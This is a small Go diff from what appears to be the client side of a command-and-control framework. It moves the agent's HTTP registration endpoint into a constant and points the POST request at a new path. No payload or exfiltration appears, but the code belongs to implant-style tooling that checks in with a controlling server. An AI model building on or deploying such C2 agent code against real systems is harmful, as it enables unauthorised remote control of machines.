@@ -11,6 +11,10 @@ import (
 	"github.com/RabbITCybErSeC/BaconC2/client/models"
 )
 
+const (
+	registerAPIPath = "%s/api/agents/register"
+)
+
 type HTTPTransport struct {
 	serverURL  string
 	agentID    string
@@ -35,7 +39,7 @@ func (t *HTTPTransport) Register(agent models.Agent) error {
 		return fmt.Errorf("failed to marshal agent: %w", err)
 	}
 
-	resp, err := t.httpClient.Post(fmt.Sprintf("%s/api/register", t.serverURL), "application/json", bytes.NewBuffer(jsonData))
+	resp, err := t.httpClient.Post(fmt.Sprintf(registerAPIPath, t.serverURL), "application/json", bytes.NewBuffer(jsonData))
 	if err != nil {
 		return fmt.Errorf("HTTP registration error: %w", err)
 	}
